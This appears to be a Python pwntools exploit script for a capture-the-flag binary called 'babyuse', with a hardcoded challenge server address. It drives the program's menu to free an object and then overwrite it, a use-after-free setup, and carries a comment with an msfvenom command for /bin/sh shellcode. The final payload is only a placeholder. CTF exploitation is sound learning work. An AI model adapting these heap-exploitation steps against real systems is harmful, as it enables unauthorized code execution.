#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-14 20:59:16
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./babyuse"
remote_ip = "202.112.51.247"
port = 3456
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	# p = remote("127.0.0.1",54321)
	# gdb.attach(p,"b*main\nc")
else:
	p = remote(remote_ip,port)


def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)
def buy(length,data):
	ru("7. Exit\n")
	sl("1")
	ru(" QBZ95\n")
	sl("1")
	ru("\n")
	sl(str(length))
	ru("\n")
	sl(data)
def select(index):
	ru("7. Exit\n")
	sl("2")
	ru("\n")
	sl(str(index))
def rename(index,length,data):
	ru("7. Exit\n")
	sl("4")
	ru("\n")
	sl(str(index))
	ru("\n")
	sl(str(length))
	ru("\n")
	sd(data)

def drop(index):
	ru("7. Exit\n")
	sl("6")
	ru("\n")
	sl(str(index))

# ru("\n")
# sl("v35FMypUQb21s5oMXzCKZQtP3IWP3NiM")

buy(0xcf,"a"*0xcf)
buy(0x20-1,"a")
buy(0x20-1,"a")
buy(0x20-1,"a")
select(2)
drop(2)
raw_input()
payload = "aaaa\n"
rename(3,0x10-1,payload)

p.interactive()